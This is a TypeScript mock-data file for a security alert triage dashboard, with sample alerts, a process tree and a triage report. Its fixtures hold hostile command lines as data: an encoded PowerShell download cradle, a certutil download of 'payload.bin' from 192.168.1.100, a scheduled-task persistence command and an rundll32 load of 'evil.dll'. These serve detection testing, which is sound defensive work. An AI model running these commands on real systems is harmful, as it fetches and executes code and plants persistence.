import type {
  Alert, AlertBundle, TimelineEvent, ProcessTree,
  RunStats, RunMetadata, ResolvedQuery, NetworkActivity, Artifact,
} from '@/types';

/* ─── Alerts ─── */
const makeAlert = (i: number, overrides: Partial<Alert> = {}): Alert => {
  const categories: Alert['category'][] = ['malware_execution', 'c2_outbound', 'persistence', 'policy_violation', 'developer_tooling'];
  const queues: Alert['queue'][] = ['soc_malware', 'soc_policy', 'soc_dev', 'soc_info'];
  const confidences: Alert['confidence'][] = ['high', 'medium', 'low'];
  const images = [
    'C:\\Windows\\System32\\powershell.exe',
    'C:\\Windows\\System32\\cmd.exe',
    'C:\\Windows\\System32\\schtasks.exe',
    'C:\\Windows\\System32\\mshta.exe',
    'C:\\Windows\\System32\\certutil.exe',
    'C:\\Windows\\System32\\rundll32.exe',
    'C:\\Windows\\System32\\bitsadmin.exe',
  ];
  const reasons = [
    'Encoded PowerShell with IEX download cradle and outbound connection to public IP',
    'LOLBin mshta.exe spawned with network connection to non-Microsoft destination',
    'Scheduled task created with embedded encoded PowerShell payload',
    'certutil.exe used to download file from external URL - possible LOLBAS abuse',
    'PowerShell execution policy bypass via -ep bypass flag',
    'rundll32.exe loading DLL from temp directory with suspicious parent chain',
    'bitsadmin.exe transferring file from external IP - potential staged payload',
  ];
  const routingWhys = [
    'score>=80 + malware_execution -> soc_malware | obfuscation + download-cradle -> high confidence',
    'lolbin_outbound matched -> soc_policy | non-MS destination + no allowlist hit -> medium confidence',
    'persistence_schtasks_create matched -> soc_policy | encoded payload in task -> high confidence',
    'certutil download pattern -> soc_policy | external URL + file write -> medium confidence',
    'powershell_policy_bypass matched -> soc_dev | developer context dampened score',
    'suspicious_path_outbound -> soc_malware | temp dir DLL + LOLBin chain -> high confidence',
    'lolbin_outbound + file transfer pattern -> soc_policy | external IP -> medium confidence',
  ];
  const idx = i % 7;
  const cat = categories[idx % categories.length];
  const q = queues[idx % queues.length];
  const conf = confidences[idx % confidences.length];
  const score = Math.max(30, 95 - i * 7 + (idx * 3));

  return {
    alert_id: `A${String(1000 + i).padStart(4, '0')}`,
    utc_time: new Date(Date.now() - (i * 300_000 + idx * 60_000)).toISOString(),
    score: Math.min(100, Math.max(0, score)),
    alert_type: 'sigma_composite',
    category: cat,
    queue: q,
    confidence: conf,
    reason: reasons[idx],
    routing_why: routingWhys[idx],
    image: images[idx],
    command_line: `${images[idx].split('\\').pop()} ${idx === 0 ? '-enc aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMALgBwAHMAMQApAA==' : idx === 2 ? '/create /tn "UpdateCheck" /tr "powershell -enc ..." /sc daily' : '/c whoami'}`,
    parent_image: idx < 3 ? 'C:\\Windows\\explorer.exe' : 'C:\\Windows\\System32\\svchost.exe',
    destination_ip: idx % 2 === 0 ? '192.168.1.100' : '8.8.8.8',
    destination_port: [443, 80, 8080, 4444, 53][idx % 5],
    process_guid: `{${crypto.randomUUID().toUpperCase()}}`,
    tags: ['attack.t1059', 'suspicious.encoding', ...(idx === 0 ? ['attack.t1071'] : []), ...(idx === 2 ? ['attack.t1053'] : [])],
    rule_id: `rule_${idx + 1}`,
    rule_name: ['powershell_obfuscation', 'lolbin_outbound', 'persistence_schtasks_create', 'suspicious_download', 'policy_bypass', 'suspicious_path_outbound', 'file_transfer'][idx],
    ...overrides,
  };
};

export const MOCK_ALERTS: Alert[] = Array.from({ length: 12 }, (_, i) => makeAlert(i));

/* ─── Timeline Events ─── */
export const MOCK_TIMELINE: TimelineEvent[] = [
  { timestamp: '2026-02-23T08:00:00Z', event_id: 1, image: 'schtasks.exe', command_line: 'schtasks /create /tn "UpdateCheck" /tr "powershell -enc ..." /sc daily', parent_image: 'explorer.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100210', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:00:05Z', event_id: 1, image: 'powershell.exe', command_line: 'powershell.exe -enc aQBlAHgA...', parent_image: 'schtasks.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100200', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:00:08Z', event_id: 3, image: 'powershell.exe', command_line: 'powershell.exe -enc aQBlAHgA...', parent_image: 'schtasks.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100200', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:00:12Z', event_id: 11, image: 'powershell.exe', command_line: '', parent_image: '', target_filename: 'C:\\ProgramData\\lab_demo.ps1', user: 'DESKTOP-LAB\\admin', rule_id: '', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:01:00Z', event_id: 1, image: 'certutil.exe', command_line: 'certutil -urlcache -split -f http://192.168.1.100/payload.bin', parent_image: 'cmd.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100300', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:01:30Z', event_id: 1, image: 'mshta.exe', command_line: 'mshta.exe vbscript:Execute("CreateObject...")', parent_image: 'explorer.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100400', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:01:35Z', event_id: 3, image: 'mshta.exe', command_line: '', parent_image: '', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '', agent_name: 'win-workstation-01', agent_id: '001' },
  { timestamp: '2026-02-23T08:02:00Z', event_id: 1, image: 'rundll32.exe', command_line: 'rundll32.exe C:\\Users\\admin\\AppData\\Local\\Temp\\evil.dll,DllMain', parent_image: 'cmd.exe', target_filename: '', user: 'DESKTOP-LAB\\admin', rule_id: '100500', agent_name: 'win-workstation-01', agent_id: '001' },
];

/* ─── Process Tree ─── */
export const MOCK_PROCESS_TREE: ProcessTree = {
  schema_version: '1.1.0',
  agent: { name: 'win-workstation-01', id: '001' },
  time_range: { start: '2026-02-23T08:00:00Z', end: '2026-02-23T09:00:00Z' },
  nodes: [
    { guid: '{EXPLORER}', pid: 1000, image: 'explorer.exe', cmdline: '', user: 'DESKTOP-LAB\\admin', first_seen: '2026-02-23T07:55:00Z', last_seen: '2026-02-23T09:00:00Z', synthetic: false, tags: [] },
    { guid: '{PARENT}', pid: 5012, image: 'schtasks.exe', cmdline: 'schtasks /create /tn "UpdateCheck" /tr "powershell -enc ..." /sc daily', user: 'DESKTOP-LAB\\admin', first_seen: '2026-02-23T08:00:00Z', last_seen: '2026-02-23T08:00:02Z', synthetic: false, tags: ['attack.t1053'] },
    { guid: '{CHILD}', pid: 7788, image: 'powershell.exe', cmdline: 'powershell.exe -enc aQBlAHgA...', user: 'DESKTOP-LAB\\admin', first_seen: '2026-02-23T08:00:05Z', last_seen: '2026-02-23T08:00:15Z', synthetic: false, tags: ['attack.t1059', 'suspicious.encoding'] },
    { guid: '{CERTUTIL}', pid: 3344, image: 'certutil.exe', cmdline: 'certutil -urlcache -split -f http://192.168.1.100/payload.bin', user: 'DESKTOP-LAB\\admin', first_seen: '2026-02-23T08:01:00Z', last_seen: '2026-02-23T08:01:10Z', synthetic: false, tags: ['attack.t1105'] },
    { guid: '{MSHTA}', pid: 9900, image: 'mshta.exe', cmdline: 'mshta.exe vbscript:Execute("CreateObject...")', user: 'DESKTOP-LAB\\admin', first_seen: '2026-02-23T08:01:30Z', last_seen: '2026-02-23T08:01:40Z', synthetic: false, tags: ['attack.t1218'] },
  ],
  edges: [
    { parent_guid: '{EXPLORER}', child_guid: '{PARENT}', reason: 'GUID link' },
    { parent_guid: '{PARENT}', child_guid: '{CHILD}', reason: 'GUID link' },
    { parent_guid: '{EXPLORER}', child_guid: '{MSHTA}', reason: 'GUID link' },
  ],
  artifacts: [
    { path: 'C:\\ProgramData\\lab_demo.ps1', created_at: '2026-02-23T08:00:12Z', creating_process_guid: '{CHILD}', creating_image: 'powershell.exe', confidence: 'HIGH', reason: 'File created by interpreter powershell.exe', tags: ['attack.t1059'] },
  ],
};

/* ─── Stats ─── */
export const MOCK_STATS: RunStats = {
  total_events: 247,
  by_event_id: { '1': 142, '3': 68, '11': 37 },
  alerts_generated: 12,
  alerts_suppressed: 3,
  suppression_hits: { 'trusted-browser-outbound': 2, 'windows-update': 1 },
  dropped_events: 5,
  dropped_by_reason: { 'missing_timestamp': 2, 'missing_event_id': 1, 'invalid_format': 2 },
  queues: { 'soc_malware': 4, 'soc_policy': 5, 'soc_dev': 2, 'soc_info': 1 },
  categories: { 'malware_execution': 3, 'c2_outbound': 2, 'persistence': 3, 'policy_violation': 2, 'developer_tooling': 2 },
  confidence_distribution: { 'high': 4, 'medium': 5, 'low': 3 },
  network_connections: 68,
  suspicious_destinations: 7,
};

/* ─── Run Metadata ─── */
export const MOCK_RUN_METADATA: RunMetadata = {
  run_id: 'f47ac10b-58cc-4372-a567-0e02b2c3d479',
  case_id: 'CASE-2026-02-23-001',
  started_at: '2026-02-23T08:00:00Z',
  completed_at: '2026-02-23T08:00:14Z',
  duration_ms: 14200,
  schema_version: '1.1.0',
  params: {
    mode: 'live',
    profile: 'soc',
    time_preset: '2h',
    agent_name: 'win-workstation-01',
    agent_id: '001',
    queues: ['soc_malware', 'soc_policy', 'soc_dev', 'soc_info'],
    include_dev_queue: false,
    min_alert_score: 70,
    out_dir: './output',
    case_id: 'CASE-2026-02-23-001',
    dry_run: false,
    alerts_only: false,
    print_stats: true,
    verify_tls: true,
  },
  stages: [
    { name: 'fetch', started_at: '2026-02-23T08:00:00Z', completed_at: '2026-02-23T08:00:03Z', duration_ms: 3200, status: 'success' },
    { name: 'normalize', started_at: '2026-02-23T08:00:03Z', completed_at: '2026-02-23T08:00:05Z', duration_ms: 1800, status: 'success' },
    { name: 'correlate', started_at: '2026-02-23T08:00:05Z', completed_at: '2026-02-23T08:00:09Z', duration_ms: 4100, status: 'success' },
    { name: 'detect', started_at: '2026-02-23T08:00:09Z', completed_at: '2026-02-23T08:00:12Z', duration_ms: 2800, status: 'success' },
    { name: 'render', started_at: '2026-02-23T08:00:12Z', completed_at: '2026-02-23T08:00:14Z', duration_ms: 2300, status: 'success' },
  ],
};

/* ─── Query ─── */
export const MOCK_QUERY: ResolvedQuery = {
  index: 'wazuh-alerts-*',
  start: '2026-02-23T06:00:00Z',
  end: '2026-02-23T08:00:00Z',
  agent_name: 'win-workstation-01',
  agent_id: '001',
  event_ids: [1, 3, 11],
  size: 10000,
};

/* ─── Report ─── */
export const MOCK_REPORT_MD = `# Triage Report - CASE-2026-02-23-001

## Executive Summary

Automated triage of **247 Sysmon events** from agent **win-workstation-01** over a 2-hour window produced **12 alerts** (4 high confidence). The most significant finding is an **encoded PowerShell download cradle** launched via a scheduled task, with subsequent file creation and outbound network activity - consistent with a staged payload delivery chain.

## Key Findings

- **schtasks.exe** created a daily scheduled task embedding an encoded PowerShell payload (T1053)
- **powershell.exe** executed encoded command containing IEX + DownloadString (T1059, T1071)
- Outbound connection from PowerShell to **8.8.8.8:443** immediately following execution
- **certutil.exe** used to download file from **192.168.1.100** - potential LOLBAS (T1105)
- **mshta.exe** spawned with VBScript execution and outbound connection (T1218)
- File **C:\\ProgramData\\lab_demo.ps1** written by PowerShell process

## Alert Summary

| Score | Type | Category | Queue | Confidence |
|-------|------|----------|-------|------------|
| 95 | sigma_composite | malware_execution | soc_malware | high |
| 88 | sigma_composite | c2_outbound | soc_policy | medium |
| 81 | sigma_composite | persistence | soc_dev | low |

## Recommendations

1. Isolate **win-workstation-01** for forensic analysis
2. Block **192.168.1.100** at network perimeter  
3. Review scheduled tasks on affected host
4. Check for lateral movement indicators from this host
`;

/* ─── Network ─── */
export const MOCK_NETWORK: NetworkActivity[] = [
  { process_guid: '{CHILD}', image: 'powershell.exe', destination_ip: '8.8.8.8', destination_port: 443, protocol: 'tcp', suspicious: true },
  { process_guid: '{MSHTA}', image: 'mshta.exe', destination_ip: '104.26.10.5', destination_port: 443, protocol: 'tcp', suspicious: true },
  { process_guid: '{CHILD}', image: 'powershell.exe', destination_ip: '192.168.1.100', destination_port: 8080, protocol: 'tcp', suspicious: true },
];

/* ─── Alert Bundles ─── */
export const MOCK_ALERT_BUNDLES: Map<string, AlertBundle> = new Map(
  MOCK_ALERTS.slice(0, 5).map((alert) => [
    alert.alert_id,
    {
      alert,
      related_events: MOCK_TIMELINE.slice(0, 3),
      process_context: MOCK_PROCESS_TREE.nodes.slice(0, 3),
      network_context: MOCK_NETWORK,
    },
  ]),
);

/* ─── Artifacts for case ─── */
export const MOCK_ARTIFACTS: Artifact[] = MOCK_PROCESS_TREE.artifacts;
